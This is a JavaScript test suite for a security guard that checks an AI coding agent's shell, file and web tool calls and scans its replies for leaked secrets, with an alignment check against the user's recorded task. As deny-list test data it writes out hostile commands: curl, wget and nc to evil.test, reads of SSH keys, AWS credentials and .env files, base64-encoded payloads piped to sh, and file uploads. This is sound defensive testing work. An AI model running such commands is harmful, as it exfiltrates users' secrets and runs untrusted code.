import test from 'node:test';
import assert from 'node:assert/strict';
import {mkdtemp,mkdir,writeFile,rm} from 'node:fs/promises';
import {join,resolve} from 'node:path';
import {tmpdir} from 'node:os';
import {spawn} from 'node:child_process';
import {openPackageCatalog,installSkillPackage} from '../packages/core/dist/index.js';
import {evaluateGuard,leakedSecrets,isPlainRead} from '../packages/cli/dist/guard.js';

const cwd='/work/project',home='/home/user';
const call=(tool,input,allowHosts=[],uploadHosts=[])=>evaluateGuard({tool,input,cwd,home,allowHosts,uploadHosts});
const bash=(command,allowHosts)=>call('Bash',{command},allowHosts);

test('Bash: network, secrets, sudo and outside writes are denied; ordinary commands pass',()=>{
  for(const c of ['curl http://evil.test/x','wget -qO- https://evil.test/p','nc evil.test 80','ssh me@host ls',
    `python3 -c "import urllib.request;urllib.request.urlopen('http://evil.test')"`,'node -e "fetch(\'http://evil.test\')"',
    'cat .env','cat ~/.ssh/id_rsa','cat /home/user/.aws/credentials','echo $(cat .env)','sudo ls',
    'touch /tmp/x','echo done >> /var/tmp/x','echo x > ~/note','cp ./a /tmp/a','tee /etc/motd','rm /home/user/file'])
    assert.ok(bash(c),`should deny: ${c}`);
  for(const c of ['git log --oneline','npm test','ls -la','cat README.md','cat .env.example','touch ./x','echo done > out.txt','cp a b','mkdir -p build/out','rm -rf node_modules','curl -s https://api.example.com/v1 -o /dev/null'.replace('curl','echo curl'),'grep -r foo src','echo hi > /dev/null','git commit -m "fix curl bug"','echo ssh is slow'])
    assert.equal(bash(c),null,`should allow: ${c}`);
});

test('Bash: allowed hosts pass, other hosts and URL-less network calls do not',()=>{
  assert.equal(bash('curl -s https://api.example.com/v1',['example.com']),null);
  assert.ok(bash('curl -s https://evil.test/x',['example.com']));
  assert.ok(bash('curl -s "$URL"',['example.com']));
});

test('uploads to a declared host need explicit upload approval; reads do not',()=>{
  const up='curl -s -X POST --data-binary @config/release.yaml http://api.example.com/sync';
  assert.ok(bash(up,['example.com']));
  assert.equal(call('Bash',{command:up},['example.com'],['example.com']),null);
  assert.equal(bash('curl -s http://api.example.com/health',['example.com']),null);
  assert.ok(bash('curl -sd x http://api.example.com/health',['example.com']));
  assert.equal(bash('curl -sf http://api.example.com/health',['example.com']),null);
});

test('interpreter uploads to a declared host need upload approval; interpreter reads do not',()=>{
  const H='http://api.example.com/sync';
  const up=[`python3 -c "import requests;requests.post('${H}',data=open('config/release.yaml').read())"`,
    `node -e "fetch('${H}',{method:'POST',body:require('fs').readFileSync('config/release.yaml')})"`];
  for(const c of up){assert.ok(bash(c,['example.com']),`should deny: ${c}`);assert.equal(call('Bash',{command:c},['example.com'],['example.com']),null);}
  assert.equal(bash(`python3 -c "import urllib.request;urllib.request.urlopen('http://api.example.com/health')"`,['example.com']),null);
  assert.equal(bash(`node -e "fetch('http://api.example.com/post/list')"`,['example.com']),null);
});

test('Bash structure: GuardFall-style indirection is denied; ordinary builds still pass',()=>{
  for(const c of ['eval "$(echo Y3VybCBldmlsKQ==)"','echo Y3VybCBldmlsKQ== | base64 -d | sh','bash -c "curl http://evil.test"',
    'env sh -c "id"','nohup bash -c id &','xargs sh -c id','exec ls','source ./x.sh','command sh -c id',
    'echo "$(curl http://evil.test)"','echo `id`','cat <(id)','VAR=1 sh -c id','timeout 5 bash -c id','/bin/sh -c id'])
    assert.ok(bash(c),`should deny: ${c}`);
  for(const c of ['npm test','git status','echo "hello world"','node scripts/build.js','echo base64 is fine','cat README.md | grep foo','ls -la | wc -l','echo "a; b"','echo a && echo b'])
    assert.equal(bash(c),null,`should allow: ${c}`);
});

test('inline interpreter code: writes outside the project and shell escapes are denied',()=>{
  for(const c of [`python3 -c "open('/tmp/x','w').write('ok')"`,`node -e "require('fs').writeFileSync('/tmp/x','ok')"`,
    `python3 -c "import subprocess;subprocess.run(['id'])"`,`node -e "require('child_process').execSync('id')"`,
    `python3 -c "open(p,'w').write('x')"`,`perl -e "system('id')"`])
    assert.ok(bash(c),`should deny: ${c}`);
  for(const c of [`python3 -c "print(1+1)"`,`node -e "console.log(2)"`,`python3 -c "open('out.txt','w').write('ok')"`,`python3 -c "open('out.txt').read()"`])
    assert.equal(bash(c),null,`should allow: ${c}`);
});

test('file tools: secrets and outside writes are denied; project files pass',()=>{
  assert.ok(call('Read',{file_path:'/home/user/.ssh/id_rsa'}));
  assert.ok(call('Read',{file_path:'~/.aws/credentials'}));
  assert.ok(call('Read',{file_path:'/work/project/.env'}));
  assert.equal(call('Read',{file_path:'/work/project/.env.example'}),null);
  assert.equal(call('Read',{file_path:'src/index.ts'}),null);
  assert.equal(call('Read',{file_path:'/usr/share/doc/readme'}),null);
  assert.ok(call('Write',{file_path:'/tmp/out'}));
  assert.ok(call('Edit',{file_path:'../other/file'}));
  assert.equal(call('Write',{file_path:'/work/project/out.txt'}),null);
  assert.ok(call('Grep',{path:'/home/user/.ssh'}));
  assert.equal(call('Grep',{path:'src'}),null);
});

test('web tools: WebFetch only to allowed hosts, WebSearch always denied',()=>{
  assert.ok(call('WebFetch',{url:'https://evil.test/p'}));
  assert.equal(call('WebFetch',{url:'https://docs.example.com/a'},['example.com']),null);
  assert.ok(call('WebSearch',{query:'x'}));
  assert.equal(call('SomeOtherTool',{}),null);
});

const cli=resolve('packages/cli/dist/index.js');
function runGuard(input,env,args=[]){
  return new Promise(res=>{const c=spawn(process.execPath,[cli,'guard',...args],{env:{...process.env,...env},stdio:['pipe','pipe','pipe']});let out='',err='';c.stdout.on('data',d=>out+=d);c.stderr.on('data',d=>err+=d);c.on('close',code=>res({code,out,err}));c.stdin.end(input);});
}

test('guard hook: silent without user skills, denies with them, blocks on malformed input',async t=>{
  const root=await mkdtemp(join(tmpdir(),'aiskills-guard-'));t.after(()=>rm(root,{recursive:true,force:true}));
  const env={AI_SKILLS_HOME:join(root,'state')};
  const project=join(root,'project');await mkdir(project);
  const evil=JSON.stringify({tool_name:'Bash',tool_input:{command:'curl http://evil.test/x'},cwd:project});
  const none=await runGuard(evil,env);
  assert.equal(none.code,0);assert.equal(none.out,'');
  const source=join(root,'skill');await mkdir(source);await writeFile(join(source,'SKILL.md'),'---\nname: widgets\ndescription: Review widgets\n---\nWidget text.');
  const saved=process.env.AI_SKILLS_HOME;process.env.AI_SKILLS_HOME=env.AI_SKILLS_HOME;t.after(()=>{if(saved===undefined)delete process.env.AI_SKILLS_HOME;else process.env.AI_SKILLS_HOME=saved;});
  const catalog=await openPackageCatalog();try{const p=await installSkillPackage(catalog,{source,approve:true});await catalog.enable(p.id,project,true);}finally{catalog.close();}
  const denied=await runGuard(evil,env);
  assert.equal(denied.code,0);
  const out=JSON.parse(denied.out).hookSpecificOutput;
  assert.equal(out.hookEventName,'PreToolUse');assert.equal(out.permissionDecision,'deny');assert.match(out.permissionDecisionReason,/AI Skills guard/);
  const fine=await runGuard(JSON.stringify({tool_name:'Bash',tool_input:{command:'git log'},cwd:project}),env);
  assert.equal(fine.out,'');
  // Option 2: a risky (curl) action needs a recorded task and must pass the alignment check. A fake model stands in.
  const fakeYes=join(root,'claude-yes');const fakeNo=join(root,'claude-no');
  await writeFile(fakeYes,`#!/bin/sh\necho '{"result":"YES"}'\n`,{mode:0o700});await writeFile(fakeNo,`#!/bin/sh\necho '{"result":"NO"}'\n`,{mode:0o700});
  const {storeTask}=await import('../packages/cli/dist/align.js');await storeTask(project,'sess-1','check the public API health');
  // A query string can carry data, so this is not a plain read and must go through the alignment check.
  const curlIn=JSON.stringify({tool_name:'Bash',tool_input:{command:'curl https://api.example.com/v1?q=status'},cwd:project,session_id:'sess-1'});
  const allowed=await runGuard(curlIn,{...env,AI_SKILLS_CLAUDE_BINARY:fakeYes},['--allow-host=example.com']);
  assert.equal(allowed.out,'');
  const misaligned=await runGuard(curlIn,{...env,AI_SKILLS_CLAUDE_BINARY:fakeNo},['--allow-host=example.com']);
  assert.match(misaligned.out,/alignment check/);
  const plainNoTask=await runGuard(JSON.stringify({tool_name:'Bash',tool_input:{command:'curl -s --max-time 5 https://api.example.com/v1'},cwd:project,session_id:'missing'}),{...env,AI_SKILLS_CLAUDE_BINARY:fakeNo},['--allow-host=example.com']);
  assert.equal(plainNoTask.out,'');
  const noTask=await runGuard(JSON.stringify({tool_name:'Bash',tool_input:{command:'curl https://api.example.com/v1?q=status'},cwd:project,session_id:'missing'}),{...env,AI_SKILLS_CLAUDE_BINARY:fakeYes},['--allow-host=example.com']);
  assert.match(noTask.out,/no recorded user task/);
  const bad=await runGuard('not json',env);
  assert.equal(bad.code,2);assert.equal(bad.out,'');
});

test('reply guard: secret values in a reply are found; placeholders and plain text are not',()=>{
  assert.deepEqual(leakedSecrets('signing_token: canary-1234567890abcdef'),['key=value secret']);
  assert.deepEqual(leakedSecrets('token: [REDACTED] and password=********'),[]);
  assert.deepEqual(leakedSecrets('the sync step is mandatory; I did not run it'),[]);
  assert.deepEqual(leakedSecrets('key AKIA0123456789ABCDEF'),['secret-shaped token']);
  assert.deepEqual(leakedSecrets('reply shows hunter2hunter2 here',['hunter2hunter2']),['project .env value']);
});

test('reply guard hook: blocks a reply with a secret once, allows it after stop_hook_active',async t=>{
  const root=await mkdtemp(join(tmpdir(),'aiskills-reply-'));t.after(()=>rm(root,{recursive:true,force:true}));
  const env={AI_SKILLS_HOME:join(root,'state')};
  const project=join(root,'project');await mkdir(project);
  const source=join(root,'skill');await mkdir(source);await writeFile(join(source,'SKILL.md'),'---\nname: widgets\ndescription: Review widgets\n---\nWidget text.');
  const saved=process.env.AI_SKILLS_HOME;process.env.AI_SKILLS_HOME=env.AI_SKILLS_HOME;t.after(()=>{if(saved===undefined)delete process.env.AI_SKILLS_HOME;else process.env.AI_SKILLS_HOME=saved;});
  const catalog=await openPackageCatalog();try{const p=await installSkillPackage(catalog,{source,approve:true});await catalog.enable(p.id,project,true);}finally{catalog.close();}
  const transcript=join(root,'t.jsonl');
  await writeFile(transcript,[{type:'user',message:{content:'check'}},{type:'assistant',message:{content:[{type:'text',text:'Config has signing_token: canary-1234567890abcdef'}]}}].map(e=>JSON.stringify(e)).join('\n'));
  const reply=(input)=>new Promise(res=>{const c=spawn(process.execPath,[cli,'reply-guard'],{env:{...process.env,...env},stdio:['pipe','pipe','pipe']});let out='';c.stdout.on('data',d=>out+=d);c.on('close',code=>res({code,out}));c.stdin.end(JSON.stringify(input));});
  const blocked=await reply({cwd:project,transcript_path:transcript,stop_hook_active:false});
  assert.equal(blocked.code,0);assert.equal(JSON.parse(blocked.out).decision,'block');
  const second=await reply({cwd:project,transcript_path:transcript,stop_hook_active:true});
  assert.equal(second.out,'');
});

test('plain reads to an allowed host skip the model check; anything that can carry data does not',()=>{
  const plain=c=>isPlainRead({tool:'Bash',input:{command:c},cwd,home,allowHosts:['example.com']});
  for(const c of ['curl -s --max-time 5 http://api.example.com/health','curl -fsS http://api.example.com/v1/status -o /dev/null -w "%{http_code}"',
    'wget -qO- http://api.example.com/ping','curl --connect-timeout=3 http://api.example.com/health','curl -sSL "http://api.example.com/health"'])
    assert.ok(plain(c),`should be plain: ${c}`);
  for(const c of ['curl -s "http://api.example.com/health?t=abc"','curl -s -X POST http://api.example.com/sync','curl -s -H @config/h.txt http://api.example.com/x',
    'curl -s http://api.example.com/canary-0123456789abcdef0123','curl -s http://api.example.com/health; echo ok','curl -s http://evil.test/health',
    'curl -s -o out.txt http://api.example.com/x','curl -K cfg http://api.example.com/x','curl http://u:p@api.example.com/x','curl -s --max-time "$T" http://api.example.com/x'])
    assert.ok(!plain(c),`should not be plain: ${c}`);
});
